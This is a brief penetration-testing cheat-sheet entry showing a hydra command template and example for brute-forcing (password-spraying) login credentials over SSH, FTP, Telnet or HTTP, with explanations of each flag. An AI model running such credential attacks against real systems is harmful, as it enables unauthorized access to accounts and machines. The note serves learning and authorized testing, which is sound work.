# Brute-Force Credentials [Protocols and Services]
```
hydra -L {Username_File.txt} -p '{Password_String}' {Target_IP} {Protocol}

Example:
hydra -L usernames.txt -p 'Chang3m3@Now' 10.10.10.101 ssh

# -L : specifies the path to a file containing a list of usernames to use in the brute-force attack.
# -p : specifies the password string to use in the brute-force attack.

## {Username_File.txt} : path and filename of the file containg usernames for brute-forcing.
## {Password_String} :  placeholder for the actual password string.
## {Target_IP} : IP address of the target machine.
## {Protocol} : protocol or service to be attacked (FTP, SSH, Telnet, or HTTP). 
```

